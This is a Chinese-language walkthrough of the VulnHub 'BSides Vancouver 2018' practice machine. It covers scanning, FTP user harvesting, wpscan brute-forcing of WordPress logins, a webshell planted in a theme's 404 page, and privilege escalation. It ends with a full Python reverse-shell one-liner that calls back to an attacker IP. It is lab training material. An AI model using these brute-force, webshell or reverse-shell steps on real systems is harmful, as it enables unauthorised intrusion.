# 原创
：  VulnHub渗透测试实战靶场 - BSIDES VANCOUVER: 2018

# VulnHub渗透测试实战靶场 - BSIDES VANCOUVER: 2018

#### VulnHub渗透测试实战靶场 - BSIDES VANCOUVER: 2018

## 环境下载

> 
戳此进行[环境下载](https://download.vulnhub.com/bsidesvancouver2018/BSides-Vancouver-2018-Workshop.ova)


## BSIDES VANCOUVER: 2018靶机搭建

> 
具体步骤参考[VirtualBox(Host only)和VMware共用同一虚拟网卡](https://blog.csdn.net/LYJ20010728/article/details/119395324?spm=1001.2014.3001.5501)



## 渗透测试

### 信息搜集

> 
用netdiscover探测一下目标靶机IP地址：`sudo netdiscover -r 192.168.56.0/24`


> 
用Nmap探测一下目标靶机的端口信息：`sudo nmap -sS -A 192.168.56.107`


> 
用dirb探测一下web目录：`dirb http://192.168.56.107`


### 漏洞挖掘

#### 方法一

> 
注意到前面扫描端口是发现开放了21端口，尝试匿名登录FTP获得用户，输入用户名：`anonymous`


> 
查看public文件夹内的`users.txt.bk`文件，下载到攻击机上，发现五个用户名


```
abatchy
john
mai
anne
doomguy

```

#### 方法二

> 
访问之前探测的web目录的结果：`http://192.168.56.107/robots.txt`<br/> 发现存在路径`http://192.168.56.107/backup_wordpress`


> 
扫描一下web路径：`http://192.168.56.107/backup_wordpress`


> 
用`wpscan`扫描WordPress，暴破后台用户名：


```
cwpscan --url http://192.168.56.107/backup_wordpress --enumerate u

```

> 
发现两个用户：`john、admin`


> 
用`wpscan`扫描WordPress，爆破后台密码：


```
wpscan --url http://192.168.56.107/backup_wordpress --passwords /home/kali/Desktop/ctf/fuzzDicts/darkweb2017-top10000.txt --usernames john                                                                                          

```

> 
成功得到一组用户名和密码：`john:enigma`


### getshell

#### 方法一

> 
采用`超级弱口令检查工具V1.0`进行暴破，线程选择4线程


> 
成功得到一组用户名和密码：`anne:princess`，连接ssh，成功getshell


#### 方法二

> 
用爆破得到的账号密码登录：`192.168.56.107/backup_wordpress/wp-login`


> 
编辑404页面，种马


> 
访问：`http://192.168.56.107/backup_wordpress/wp-content/themes/twentysixteen/404.php`，写入的代码成功执行


> 
用nc起一个监听，再次访问种马页面，成功反弹shell


### 提权

#### 方法一

> 
查看用户id以及组id信息，发现用户`anne`在sudo组，直接sudo提权，成功拿到root权限


#### 方法二

> 
查找每个用户文件，和浏览各目录文件，发现位于 `/usr/local/bin/cleanup` 文件，其权限是777，查看内容<br/> 为：


```
#!/bin/sh
rm -rf /var/log/apache2/* # Clean those damn logs!!

```

> 
由于此文件权限为777，直接修改为一个反弹shell


```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",4321));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```

> 
起一个nc监听，成功接收到反弹shell

